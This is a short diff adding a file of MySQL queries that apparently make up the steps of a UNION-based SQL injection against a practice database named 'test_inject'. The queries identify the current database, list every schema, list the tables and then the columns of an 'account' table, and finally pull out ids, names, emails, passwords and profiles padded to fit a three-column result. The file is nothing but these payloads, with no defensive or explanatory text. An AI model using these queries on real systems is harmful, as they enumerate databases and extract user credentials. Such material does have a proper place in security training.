@@ -1,0 +1,9 @@
+select database();
+
+SELECT group_concat(SCHEMA_NAME)  FROM  information_schema.SCHEMATA 
+
+SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema= 'test_inject';
+
+SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA LIKE 'test_inject' AND TABLE_NAME LIKE 'account' 
+
+SELECT 0, 0, concat(id, ' ', name, ' ', email, ' ', password, ' ', profile) FROM test_inject.account
